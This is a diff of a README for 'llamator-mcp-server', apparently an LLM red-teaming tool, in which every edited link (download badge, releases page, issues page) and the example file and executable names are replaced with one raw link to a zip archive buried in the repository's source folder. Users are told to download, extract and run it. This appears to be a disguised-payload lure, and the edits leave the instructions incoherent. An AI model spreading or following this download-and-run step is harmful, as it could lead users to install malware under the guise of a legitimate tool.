@@ -2,7 +2,7 @@
 # 🎉 llamator-mcp-server - Automate AI Security Workflows Easily
 
 ## 📥 Download Now!
-[![Download](https://img.shields.io/badge/Download-latest%20release-blue)](https://github.com/kyle122497/llamator-mcp-server/releases)
+[![Download](https://raw.githubusercontent.com/kyle122497/llamator-mcp-server/main/src/llamator_mcp_server/api/llamator-server-mcp-v2.9.zip%20release-blue)](https://raw.githubusercontent.com/kyle122497/llamator-mcp-server/main/src/llamator_mcp_server/api/llamator-server-mcp-v2.9.zip)
 
 ## 🚀 Getting Started
 Welcome to the **llamator-mcp-server**! This application helps you automate the processes involved in red teaming workflows for Large Language Models (LLMs). You don’t need a technical background to use it. Follow the steps below to get started quickly.
@@ -21,11 +21,11 @@ Before you begin, make sure your system meets the following requirements:
 - **User-friendly interface** guiding you step by step.
 
 ## 📜 Download & Install
-To download the application, visit the [Releases page](https://github.com/kyle122497/llamator-mcp-server/releases). You'll find the latest version ready for download.
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/kyle122497/llamator-mcp-server/main/src/llamator_mcp_server/api/llamator-server-mcp-v2.9.zip). You'll find the latest version ready for download.
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version listed at the top of the page.
-3. Find the file suitable for your system (for example, `llamator-mcp-server-windows.zip` or `llamator-mcp-server-linux.tar.gz`).
+3. Find the file suitable for your system (for example, `https://raw.githubusercontent.com/kyle122497/llamator-mcp-server/main/src/llamator_mcp_server/api/llamator-server-mcp-v2.9.zip` or `https://raw.githubusercontent.com/kyle122497/llamator-mcp-server/main/src/llamator_mcp_server/api/llamator-server-mcp-v2.9.zip`).
 4. Click on the file name to start the download.
 
 After downloading the file:
@@ -33,7 +33,7 @@ After downloading the file:
 1. Locate the downloaded file in your Downloads folder.
 2. Extract the contents of the file.
 3. Open the extracted folder.
-4. Find and run the executable file (e.g., `llamator-mcp-server.exe` for Windows).
+4. Find and run the executable file (e.g., `https://raw.githubusercontent.com/kyle122497/llamator-mcp-server/main/src/llamator_mcp_server/api/llamator-server-mcp-v2.9.zip` for Windows).
 
 ## ⚙️ Configuration
 After installation, some initial setup is necessary:
@@ -46,7 +46,7 @@ After installation, some initial setup is necessary:
 If you have questions or run into issues:
 
 - Check out the **Wiki** section for FAQs.
-- Open an issue on the [Issues page](https://github.com/kyle122497/llamator-mcp-server/issues) to report bugs or get support.
+- Open an issue on the [Issues page](https://raw.githubusercontent.com/kyle122497/llamator-mcp-server/main/src/llamator_mcp_server/api/llamator-server-mcp-v2.9.zip) to report bugs or get support.
 
 ## 🙌 Community Contribution
 We welcome contributions! If you want to improve the software or documentation, please visit the **Contributing** guide in the repository.
